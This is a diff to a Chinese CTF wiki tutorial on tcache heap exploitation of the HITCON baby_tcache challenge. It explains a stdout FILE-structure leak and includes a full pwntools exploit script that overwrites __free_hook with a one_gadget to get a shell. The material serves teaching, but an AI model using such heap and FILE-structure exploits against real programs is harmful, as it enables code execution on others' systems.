@@ -1218,7 +1218,7 @@ struct Chunk {
 
 使用了一个在堆上分配的结构来记录所有 `Chunk` 结构体，一共可以分配 10 个块。
 
-程序的读入输入函数存在一个 null-byte-one 漏洞 ，具体见如下代码
+程序的读入输入函数存在一个 null-byte-overflow 漏洞 ，具体见如下代码
 
 ```c
 unsigned __int64 __fastcall read_input(_BYTE *malloc_p, int sz)
@@ -1642,7 +1642,7 @@ int new()
     exit(-1);
   printf("Data:");
   read_input((__int64)malloc_p, size);
-  malloc_p[size] = 0;                           //null byte bof
+  malloc_p[size] = 0;                           // null byte bof
   bss_arr[i] = malloc_p;
   v0 = size_arr;
   size_arr[i] = size;
@@ -1654,71 +1654,73 @@ int new()
 
 程序的漏洞很容易发现 ，而且申请的 chunk 大小可控 ，所以一般考虑构造 overlapping chunk 处理 。但是问题在于即使把 main_arena 相关的地址写到了 chunk 上 ，也没法调用 show 功能做信息泄露 ，因为程序就没提供这个功能 。
 
-当然如果没有信息泄露也可以考虑 part write 去改掉 main_arena 相关地址的后几个字节 ，利用 tcache 机制把 `__free_hook` chunk 写进 tcache 的链表中 ，后面利用 unsortedbin attack 往 `__free_hook` 里面写上 unsortedbin addr ，后面把 `__free_hook` 分配出来 ，再利用 part write 在 `__free_hook` 里面写上 one_shoot ，不过这个方法的爆破工作量太大需要4096次 ，感兴趣的可以试试 。
+于是有两种思路：
 
-出题者提供一个基于文件结构体的内存读方法来实现内存泄露 ，简单说来就是修改 puts 函数工作过程中 stdout 结构的 `__IO_write_base` ，从而达到内存泄露 ，这个方法的优点在于只爆破半个字节 run 16 次即可 ，具体操作见后面的 exp 解析部分 。
+1. 可以考虑 partial overwrite 去改掉 main_arena 相关地址的后几个字节 ，利用 tcache 机制把 `__free_hook` chunk 写进 tcache 的链表中 ，后面利用 unsortedbin attack 往 `__free_hook` 里面写上 unsortedbin addr ，后面把 `__free_hook` 分配出来 ，再利用 partial overwrite 在 `__free_hook` 里面写上 one_shoot ，不过这个方法的爆破工作量太大需要 4096 次
+
+2. 通过 IO file 进行泄露。题目中使用到了 `puts` 函数，会最终调用到 `_IO_new_file_overflow`，该函数会最终使用 `_IO_do_write` 进行真正的输出。在输出时，如果具有缓冲区，会输出 `_IO_write_base` 开始的缓冲区内容，直到 `_IO_write_ptr` （也就是将 `_IO_write_base` 一直到 `_IO_write_ptr` 部分的值当做缓冲区，在无缓冲区时，两个指针指向同一位置，位于该结构体附近，也就是 libc 中），但是在 `setbuf` 后，理论上会不使用缓冲区。然而如果能够修改 `_IO_2_1_stdout_` 结构体的 flags 部分，使得其认为 stdout 具有缓冲区，再将 `_IO_write_base` 处的值进行 partial overwrite ，就可以泄露出 libc 地址了。
+
+思路 2 中涉及到的相关代码：
+
+`puts` 函数最终会调用到该函数，我们需要满足部分 flag 要求使其能够进入 `_IO_do_write`：
+
+```c
+int
+_IO_new_file_overflow (_IO_FILE *f, int ch)
+{
+  if (f->_flags & _IO_NO_WRITES) 
+    {
+      f->_flags |= _IO_ERR_SEEN;
+      __set_errno (EBADF);
+      return EOF;
+    }
+  /* If currently reading or no buffer allocated. */
+  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL) 
+    {
+      :
+      :
+    }
+  if (ch == EOF)
+    return _IO_do_write (f, f->_IO_write_base,  // 需要调用的目标，如果使得 _IO_write_base < _IO_write_ptr，且 _IO_write_base 处
+                                                // 存在有价值的地址 （libc 地址）则可进行泄露
+                                                // 在正常情况下，_IO_write_base == _IO_write_ptr 且位于 libc 中，所以可进行部分写
+			 f->_IO_write_ptr - f->_IO_write_base);
+
+```
+
+进入后的部分：
+
+```c
+static
+_IO_size_t
+new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)
+{
+  _IO_size_t count;
+  if (fp->_flags & _IO_IS_APPENDING)  /* 需要满足 */
+    /* On a system without a proper O_APPEND implementation,
+       you would need to sys_seek(0, SEEK_END) here, but is
+       not needed nor desirable for Unix- or Posix-like systems.
+       Instead, just indicate that offset (before and after) is
+       unpredictable. */
+    fp->_offset = _IO_pos_BAD;
+  else if (fp->_IO_read_end != fp->_IO_write_base)
+    {
+     ............
+    }
+  count = _IO_SYSWRITE (fp, data, to_do); // 这里真正进行 write
+
+```
+
+可以看到，为调用到目标函数位置，需要满足部分 flags 要求，具体需要满足的 flags ：
+
+```c
+_flags = 0xfbad0000  // Magic number
+_flags & = ~_IO_NO_WRITES // _flags = 0xfbad0000
+_flags | = _IO_CURRENTLY_PUTTING // _flags = 0xfbad0800
+_flags | = _IO_IS_APPENDING // _flags = 0xfbad1800
+```
 
 ##### 操作过程
-
-- exp 部分
-
-```python
-from pwn import *
-r=process('./baby_tcache'),env={"LD_PRELOAD":"./libc.so.6"})
-
-libc=ELF("./libc.so.6")
-
-def menu(opt):
-    r.sendlineafter("Your choice: ",str(opt))
-
-def alloc(size,data='a'):
-    menu(1)
-    r.sendlineafter("Size:",str(size))
-    r.sendafter("Data:",data)
-
-def delete(idx):
-    menu(2)
-    r.sendlineafter("Index:",str(idx))
-
-def exp():
-    alloc(0x500-0x8)  # 0
-    alloc(0x30)   # 1
-    alloc(0x40)  # 2
-    alloc(0x50)  # 3
-    alloc(0x60)  # 4
-    alloc(0x500-0x8)  # 5
-    alloc(0x70)  # 6  gap to top
-    
-    delete(4)
-    alloc(0x68,'A'*0x60+'\x60\x06')  # set the prev size
-    
-    delete(2)
-    delete(0)
-    delete(5)  # backward coeleacsing
-    alloc(0x500-0x9+0x34)
-    delete(4)
-    alloc(0xa8,'\x60\x07')  # corrupt the fd
-    
-    alloc(0x40,'a')
-   
-    alloc(0x3e,p64(0xfbad1800)+p64(0)*3+'\x00')  # overwrite the file-structure
-    
-    print repr(r.recv(8))
-    print "leak!!!!!!!!!"
-    info1 = r.recv(8)
-    print repr(info1)
-    libc.address=u64(info1)-0x3ed8b0
-    log.info("libc @ "+hex(libc.address))
-    alloc(0xa8,p64(libc.symbols['__free_hook']))
-    alloc(0x60,"A")
-    alloc(0x60,p64(libc.address+0x4f322)) # one gadget with $rsp+0x40 = NULL
-    delete(0)
-    r.interactive()
-
-if __name__=='__main__':
-
-    exp()
-```
 
 - 形成 overlapping chunk
 
@@ -1799,60 +1801,68 @@ gdb-peda$ x/20xg 0x00007fa8a0a40700
 - 文件结构体更改缘由
   - 通过修改 stdout->_flags 使得程序流能够流到 _IO_do_write (f , f->_IO_write_base , f->_IO_write_ptr - f->_IO_write_base) 这个函数
   
-```c
-_flags = 0xfbad0000  // Magic number
-_flags & = ~_IO_NO_WRITES // _flags = 0xfbad0000
-_flags | = _IO_CURRENTLY_PUTTING // _flags = 0xfbad0800
-_flags | = _IO_IS_APPENDING // _flags = 0xfbad1800
-```
+- 完整 exp
 
-```c
-int
-_IO_new_file_overflow (_IO_FILE *f, int ch)
-{
-  if (f->_flags & _IO_NO_WRITES) /* SET ERROR   !!! key 1 in fact , automatic satisfaction*/
-    {
-      f->_flags |= _IO_ERR_SEEN;
-      __set_errno (EBADF);
-      return EOF;
-    }
-  /* If currently reading or no buffer allocated. */
-  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL)
-/* !!! key 2 not into  so f->_flags fbad1800 or other is ok*/
-    {
-      :
-      :
-    }
-  if (ch == EOF)
-    return _IO_do_write (f, f->_IO_write_base,  // !!! our target
-			 f->_IO_write_ptr - f->_IO_write_base);
+```python
+from pwn import *
+r = process('./baby_tcache'), env={"LD_PRELOAD":"./libc.so.6"})
 
-```
+libc = ELF("./libc.so.6")
 
-```c
-static
-_IO_size_t
-new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)
-{
-  _IO_size_t count;
-  if (fp->_flags & _IO_IS_APPENDING)  /* !!! key3 code flow into if so not into else if */
-    /* On a system without a proper O_APPEND implementation,
-       you would need to sys_seek(0, SEEK_END) here, but is
-       not needed nor desirable for Unix- or Posix-like systems.
-       Instead, just indicate that offset (before and after) is
-       unpredictable. */
-    fp->_offset = _IO_pos_BAD;
-  else if (fp->_IO_read_end != fp->_IO_write_base)
-    {
-     ............
-    }
-  count = _IO_SYSWRITE (fp, data, to_do); // Our aim f->_IO_write_base is data here , so can leak 
+def menu(opt):
+    r.sendlineafter("Your choice: ",str(opt))
 
+def alloc(size,data='a'):
+    menu(1)
+    r.sendlineafter("Size:",str(size))
+    r.sendafter("Data:",data)
+
+def delete(idx):
+    menu(2)
+    r.sendlineafter("Index:",str(idx))
+
+def exp():
+    alloc(0x500-0x8)  # 0
+    alloc(0x30) # 1
+    alloc(0x40) # 2
+    alloc(0x50) # 3
+    alloc(0x60) # 4
+    alloc(0x500 - 0x8) # 5
+    alloc(0x70) # 6  gap to avoid top consolidation
+    
+    delete(4)
+    alloc(0x68, 'A'*0x60 + '\x60\x06')  # set the prev size
+    
+    delete(2)
+    delete(0)
+    delete(5) # backward coeleacsing
+    alloc(0x500 - 0x9 + 0x34)
+    delete(4)
+    alloc(0xa8, '\x60\x07') # corrupt the fd
+    
+    alloc(0x40, 'a')
+   
+    alloc(0x3e, p64(0xfbad1800) + p64(0) * 3 + '\x00') # overwrite the file-structure
+    
+    print(repr(r.recv(8)))
+    print("leak!!!!!!!!!")
+    info1 = r.recv(8)
+    print(repr(info1))
+    libc.address = u64(info1) - 0x3ed8b0
+    log.info("libc @ " + hex(libc.address))
+    alloc(0xa8, p64(libc.symbols['__free_hook']))
+    alloc(0x60, "A")
+    alloc(0x60, p64(libc.address + 0x4f322)) # one gadget with $rsp+0x40 = NULL
+    delete(0)
+    r.interactive()
+
+if __name__=='__main__':
+    exp()
 ```
 
 ##### Challenge 2 小结
 
-这个程序的利用过程是一个应该学会的技巧 ，这种通过文件结构体的方式来实现内存的读写的相关资料可以参考台湾 Angelboy 的博客 。最近的 hctf2018 steak 这个程序的信息泄露多数人是通过 copy puts_addr 到 `__free_hook` 指针里 ，实现信息泄露 。实际上也可以通过修改文件结构体的字段来实现信息泄露 ，感兴趣的可以试试 。
+这个程序的利用过程是一个有用的技巧，这种通过文件结构体的方式来实现内存的读写的相关资料可以参考台湾 Angelboy 的博客。在 hctf2018 steak 中，也存在一个信息泄露的问题，大多数人采用了 copy puts_addr 到 `__free_hook` 指针里实现信息泄露，但实际上也可以通过修改文件结构体的字段来实现信息泄露。
 
 #### Challenge 3 : 2014 HITCON stkof
 
@@ -1997,3 +2007,4 @@ if __name__ == "__main__":
 ### 0x06 建议习题：
 
 * 2018 HITCON children_tcache
+* 2018 BCTF houseOfAtum
